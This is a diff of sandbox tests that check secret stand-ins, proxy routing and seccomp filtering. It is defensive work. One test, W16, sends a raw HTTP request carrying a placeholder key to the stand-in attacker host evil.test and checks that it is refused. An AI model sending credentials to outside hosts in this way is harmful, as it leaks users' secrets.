@@ -247,12 +247,15 @@ test("W10 macOS: the program sees a stand-in key and only the door; a new site s
   const root = await realpath(await mkdtemp(join(tmpdir(), "branch-wall-")));
   t.after(() => discardTemp(root));
   const wall = wallFor({ keySites: { TOKEN: "api.example.test" } });
-  const opened = await openWall(wall, plain(root), { workspace: root, secrets: { TOKEN: "real-value-1234" } },
+  const start = { ...plain(root), env: { ...plain(root).env, OTHER: "real-other-5678" } };
+  const opened = await openWall(wall, start, { workspace: root, secrets: { TOKEN: "real-value-1234", OTHER: "real-other-5678" } },
     { platform: "darwin", exists: async (path) => path === sandboxExecPath });
   t.after(() => opened.close());
   assert.equal(opened.start.executable, "/usr/bin/sandbox-exec");
   assert.match(opened.start.env.TOKEN, /^branch_[a-f0-9]{32}$/);
-  assert.ok(!JSON.stringify(opened.start).includes("real-value-1234"), "the real key is nowhere in what starts");
+  assert.match(opened.start.env.OTHER, /^branch_[a-f0-9]{32}$/, "a key with no site is a stand-in too");
+  for (const real of ["real-value-1234", "real-other-5678"])
+    assert.ok(!JSON.stringify(opened.start).includes(real), "no real key is anywhere in what starts");
   const port = Number(new URL(opened.start.env.HTTP_PROXY).port);
   assert.match(opened.start.args[1], new RegExp(`localhost:${port}`));
   assert.match(opened.start.env.ALL_PROXY, /^socks5h:\/\/127\.0\.0\.1:\d+$/);
@@ -296,6 +299,8 @@ test("W12 Linux: bwrap through the fixed starter, the filter written, the door b
     probe: async (executable, args) => { probed.push([executable, ...args]); return { code: 0, stdout: "", stderr: "", missing: false }; } };
   const opened = await openWall(wallFor({ keySites: { TOKEN: "api.example.test" } }), plain(root), { workspace: root, secrets: { TOKEN: "real-value-1234" } }, deps);
   assert.equal(opened.start.executable, "/bin/sh");
+  assert.equal(opened.start.args[opened.start.args.indexOf("--seccomp") + 1], "9", "the filter is read from the descriptor the starter opens");
+  assert.match(seccompStarterScript, / 9< "\$f"$/);
   const [flag, script, name, filter, bwrap, ...rest] = opened.start.args;
   assert.deepEqual([flag, script, name, bwrap], ["-c", seccompStarterScript, "branch-wall", "/usr/bin/bwrap"]);
   assert.equal((await readFile(filter)).length % 8, 0, "the filter is whole instructions");
@@ -328,6 +333,11 @@ test("W13 the plain box puts scripts behind the wall only when the call carries 
   assert.equal(walled.argv[0], "/usr/bin/sandbox-exec");
   assert.equal(spawned[1].executable, "/usr/bin/sandbox-exec");
   const kept = await handle.argvFor({ executable: "/bin/sleep", args: ["9"] }, { ...limits, wall: wallFor({ network: "per-site" }) });
+  const keptOpen = await openWall(wallFor({ network: "open", keySites: { TOKEN: "api.example.test" } }), plain(root),
+    { workspace: root, secrets: { TOKEN: "real-value-1234" }, proxy: false }, { platform: "darwin", exists: async () => true });
+  assert.equal(keptOpen.start.env.HTTP_PROXY, undefined, "no door is ever opened for a program left running");
+  assert.match(keptOpen.start.env.TOKEN, /^branch_/);
+  await keptOpen.close();
   assert.equal(kept.executable, "/usr/bin/sandbox-exec");
   assert.equal(kept.env.HTTP_PROXY, "http://127.0.0.1:9", "a program left running gets no door, only the dead address");
   assert.ok(!kept.args[1].includes("network-outbound"));
@@ -407,6 +417,10 @@ test("W16 a stand-in becomes the real key only for its own site, and the answer 
   assert.ok(proxy.hidden.size > 0);
   const elsewhere = await raw(`GET http://evil.test/ HTTP/1.1\r\nHost: evil.test\r\nX-Key: ${keys[0].placeholder}\r\nConnection: close\r\n\r\n`);
   assert.match(elsewhere, /403[\s\S]*belongs to api\.example\.test/);
+  const siteless = { name: "LOOSE", placeholder: `branch_${"c".repeat(32)}`, value: "loose-1234", site: "" };
+  keys.push(siteless);
+  assert.match(await raw(`GET http://api.example.test/ HTTP/1.1\r\nHost: api.example.test\r\nX-Key: ${siteless.placeholder}\r\nConnection: close\r\n\r\n`),
+    /No site is set for the key LOOSE/);
   const unknown = await raw(`GET http://api.example.test/ HTTP/1.1\r\nHost: api.example.test\r\nX-Key: branch_${"b".repeat(32)}\r\nConnection: close\r\n\r\n`);
   assert.match(unknown, /stand-in key Branch does not know/);
   assert.equal(site.seen.length, 1);
